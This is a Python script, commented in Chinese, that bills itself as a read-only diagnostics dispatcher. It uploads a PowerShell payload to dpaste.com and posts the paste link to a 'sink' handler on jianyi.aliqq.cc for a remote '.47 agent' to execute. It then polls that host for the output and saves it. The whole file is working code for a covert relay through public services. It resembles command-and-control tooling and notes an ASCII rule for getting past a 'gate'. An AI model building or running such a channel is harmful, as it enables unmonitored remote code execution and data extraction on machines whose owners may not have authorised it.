# -*- coding: utf-8 -*-
"""只读诊断投递器：把 _diag_checkin.ps1 经 dpaste → sink 送到 .47 agent 执行，取回结果。

用法：python run_diag_checkin.py
不依赖 _zfcred / Playwright / MinIO —— 只走 dpaste 与 sink 两个公开端点。
"""
import json
import os
import re
import subprocess
import sys
import time
import urllib.parse
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
PS1 = os.path.join(HERE, '_diag_checkin.ps1')
SINK = 'http://jianyi.aliqq.cc/agent86sink.ashx'
SITE = 'http://jianyi.aliqq.cc/agent86/'
TAG = 'job_shuzi_diag'


def check_ascii(path):
    raw = open(path, 'rb').read()
    bad = [(i, b) for i, b in enumerate(raw) if b > 127]
    if bad:
        raise SystemExit('载荷含非 ASCII 字节 %d 处，首处偏移 %d；按闸门规矩改 ASCII 再投。'
                         % (len(bad), bad[0][0]))
    return len(raw)


def dpaste(path):
    for attempt in range(3):
        r = subprocess.run(['curl.exe', '-s', '-i', '--max-time', '120', '-X', 'POST',
                            '--data-urlencode', 'content@' + path,
                            '-d', 'expiry_days=30', '-d', 'syntax=text',
                            'https://dpaste.com/api/v2/'],
                           capture_output=True, text=True, encoding='utf-8', errors='replace')
        m = re.search(r'^location:\s*(\S+)', r.stdout, re.M)
        if m:
            return m.group(1) + '.txt'
        if '429' in (r.stdout or '') or 'Too Many' in (r.stdout or ''):
            print('  dpaste 限流，等 65 秒…', flush=True)
            time.sleep(65)
            continue
        time.sleep(5)
    raise SystemExit('dpaste 上传失败（三次）')


def get(url, timeout=60):
    with urllib.request.urlopen(url, timeout=timeout) as r:
        return r.read().decode('utf-8', 'replace')


def post_sink(data, timeout=90):
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(SINK, data=body,
                                 headers={'Content-Type': 'application/x-www-form-urlencoded'})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read().decode('utf-8', 'replace')


def main():
    n = check_ascii(PS1)
    print('载荷 ASCII 校验通过：%d 字节' % n, flush=True)
    url = dpaste(PS1)
    print('载荷 URL: ' + url, flush=True)
    print('投递回执: ' + post_sink({'action': 'result', 'tag': TAG, 'body': url}).strip(), flush=True)

    seen = set()
    deadline = time.time() + 420
    while time.time() < deadline:
        time.sleep(10)
        try:
            listing = get(SINK + '?action=list', timeout=25)
        except Exception as e:
            print('  列表读取失败: %s' % str(e)[:60], flush=True)
            continue
        names = re.findall(r'(\S*shuzi_diag\S*\.txt)', listing)
        for name in names:
            if name in seen:
                continue
            seen.add(name)
            try:
                body = get(SITE + name, timeout=30)
            except Exception:
                continue
            print('\n=== %s ===' % name, flush=True)
            print(body, flush=True)
            if '"members_with_checkin_14d"' in body:
                open(os.path.join(HERE, '_diag_result.txt'), 'w', encoding='utf-8').write(body)
                print('\n已存 _diag_result.txt', flush=True)
                return 0
        print('  等待结果…', flush=True)
    print('超时未见结果', flush=True)
    return 2


if __name__ == '__main__':
    sys.exit(main())
